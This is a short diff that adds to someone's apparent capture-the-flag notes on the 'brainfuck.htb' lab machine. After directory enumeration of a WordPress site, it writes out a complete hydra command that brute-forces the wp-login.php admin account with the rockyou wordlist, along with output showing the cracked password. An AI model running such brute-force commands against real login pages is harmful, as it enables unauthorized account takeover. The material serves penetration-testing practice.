@@ -70,3 +70,13 @@ INSANE Level
                 /wp-content           (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-content/]
                 /wp-includes          (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-includes/]
                 /wp-admin             (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-admin/]
+
+
+
+
+        https://brainfuck.htb/wp-login.php
+            Brute Forcing the login page
+
+            └─$ hydra -l admin -P /home/kali/Desktop/Transfer_to_Victim_Machine/1000Million_Passwd/rockyou.txt brainfuck.htb https-post-form "/wp-login.php/login:username=^USER^&password=^PASS^&loginform=Login&lang=en_US:The password you entered for the username admin is incorrect." -V -f -o hydra-output.txt -t 4 -s 443 -I 
+
+            443][http-post-form] host: brainfuck.htb   login: admin   password: laila123
